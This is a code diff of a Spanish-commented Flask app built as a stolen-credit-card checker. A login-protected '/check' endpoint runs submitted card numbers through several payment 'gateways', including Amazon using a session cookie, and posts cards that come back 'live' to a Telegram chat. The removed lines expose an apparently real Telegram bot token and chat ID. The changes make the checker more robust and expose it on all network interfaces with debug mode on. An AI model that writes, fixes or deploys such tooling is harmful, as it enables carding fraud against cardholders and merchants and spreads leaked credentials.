@@ -7,8 +7,8 @@ import asyncio
 import tec, red, em, amazon
 
 app = Flask(__name__)
-app.secret_key = 'tu_secreto_super_seguro'  # Cambiar a algo fuerte y secreto
-CORS(app)
+app.secret_key = 'tu_secreto_super_seguro_cámbialo_por_un_valor_seguro'  # Cambia por algo fuerte y secreto
+CORS(app)  # En producción limita orígenes permitidos
 
 # Configuración base de datos SQLite
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
@@ -41,7 +41,7 @@ def create_tables():
 def index():
     if 'user_id' in session:
         return redirect(url_for('dashboard'))
-    return render_template('index.html')  # Aquí se muestra el login
+    return render_template('index.html')  # Página de login
 
 @app.route('/style.css')
 def style():
@@ -102,8 +102,8 @@ def logout():
     return redirect(url_for('index'))
 
 # Telegram bot token y chat
-TELEGRAM_BOT_TOKEN = '7549342155:AAGTeGoCr6s56nckuq8KEDDB7aCKiU5BW3Y'
-TELEGRAM_CHAT_ID = '-1002762787906'
+TELEGRAM_BOT_TOKEN = 'TU_TOKEN_AQUI'
+TELEGRAM_CHAT_ID = 'TU_CHAT_ID_AQUI'
 
 def enviar_telegram(mensaje):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -112,11 +112,14 @@ def enviar_telegram(mensaje):
         'text': mensaje,
         'parse_mode': 'Markdown'
     }
-    req.post(url, data=data)
+    try:
+        req.post(url, data=data)
+    except Exception as e:
+        print(f"Error enviando Telegram: {e}")
 
-# Endpoint para check tarjetas (protegido)
+# Endpoint para check tarjetas (SINCRONO, usando asyncio.run para async)
 @app.route('/check', methods=['POST'])
-async def check_card():
+def check_card():
     if 'user_id' not in session:
         return jsonify({'status': 'error', 'message': 'No autorizado'}), 401
 
@@ -125,22 +128,26 @@ async def check_card():
     gateway = data.get('gateway', 'TEC')
     cookie = data.get('cookie', '')
 
-    if gateway == 'TEC':
-        result = await tec.process_card(cc)
-    elif gateway == 'RED':
-        result = await red.process_card(cc)
-    elif gateway == 'EM':
-        result = await em.process_card(cc)
-    elif gateway == 'AMAZON':
-        result = amazon.procesar_tarjeta_amazon(cc, cookie)  # Síncrono
-    else:
-        result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}
+    try:
+        if gateway == 'TEC':
+            result = asyncio.run(tec.process_card(cc))
+        elif gateway == 'RED':
+            result = asyncio.run(red.process_card(cc))
+        elif gateway == 'EM':
+            result = asyncio.run(em.process_card(cc))
+        elif gateway == 'AMAZON':
+            result = amazon.procesar_tarjeta_amazon(cc, cookie)  # Síncrono
+        else:
+            result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}
 
-    if result['status'] == 'live':
-        mensaje_telegram = f"✅ *LIVE* - {result['cc']}\n{result['message']}"
-        enviar_telegram(mensaje_telegram)
+        if result['status'] == 'live':
+            mensaje_telegram = f"✅ *LIVE* - {result['cc']}\n{result['message']}"
+            enviar_telegram(mensaje_telegram)
 
-    return jsonify(result)
+        return jsonify(result)
+
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=5000, debug=True)
